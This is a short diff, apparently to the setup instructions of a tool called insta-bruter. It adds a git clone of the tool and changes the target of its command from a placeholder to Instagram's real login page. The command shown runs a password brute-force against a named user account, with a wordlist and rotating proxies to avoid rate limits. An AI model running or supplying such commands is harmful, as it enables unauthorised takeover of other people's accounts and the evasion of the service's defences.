@@ -25,11 +25,13 @@
 apt update -y
 apt upgrade -y
 apt install git
+git clone https://github.com/REDPYTHON804/insta-bruter.git
 apt install python3
 apt install python3-pip
 pip install -r requirements.txt
+
 python3 instabrute.py \
-  --url https://yourtarget.com/login \
+  --url https://www.instagram.com/accounts/login/ \
   --username Target_user \
   --wordlist passwords.txt \
   --proxies proxy.txt \
